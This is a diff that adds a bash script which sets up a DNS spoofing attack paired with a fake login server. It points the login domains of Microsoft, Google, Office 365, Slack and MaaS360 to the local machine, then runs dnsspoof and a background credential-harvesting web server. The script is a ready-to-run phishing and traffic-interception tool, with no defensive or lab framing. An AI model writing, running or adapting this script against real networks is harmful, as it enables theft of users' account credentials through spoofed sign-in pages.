@@ -1,0 +1,28 @@
+#!/usr/bin/env bash
+# Quick DNS spoof + fake login server
+# Usage: ./commands/dns-spoof [target_ip]
+BASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
+NET_IFACE=$(ip route | awk '/default/{print $5; exit}')
+NET_IP=$(ip -4 addr show "$NET_IFACE" 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1)
+DNS_HOSTS="$BASE_DIR/captures/dns_hosts.txt"
+
+echo "[+] Starting DNS spoof (redirecting to $NET_IP)..."
+> "$DNS_HOSTS"
+for d in login.microsoftonline.com login.live.com outlook.office365.com \
+         accounts.google.com mail.google.com docs.google.com \
+         services.m3.maas360.com app.slack.com; do
+    echo "$NET_IP $d" >> "$DNS_HOSTS"
+done
+
+nohup python3 "$BASE_DIR/tools/fake_login_server.py" > /dev/null 2>&1 &
+echo "[+] Fake login on http://$NET_IP:80"
+
+if command -v dnsspoof &>/dev/null; then
+    nohup dnsspoof -i "$NET_IFACE" -f "$DNS_HOSTS" > "$BASE_DIR/captures/dns_spoof.log" 2>&1 &
+    echo "[+] dnsspoof running, spoofing:"
+    cat "$DNS_HOSTS"
+else
+    echo "[!] dnsspoof not found (apt install dsniff)"
+fi
+echo "[+] PID file: $BASE_DIR/captures/.running_pids"
+echo "[+] Ctrl+C to stop. Run: pkill -f 'fake_login|dnsspoof'"
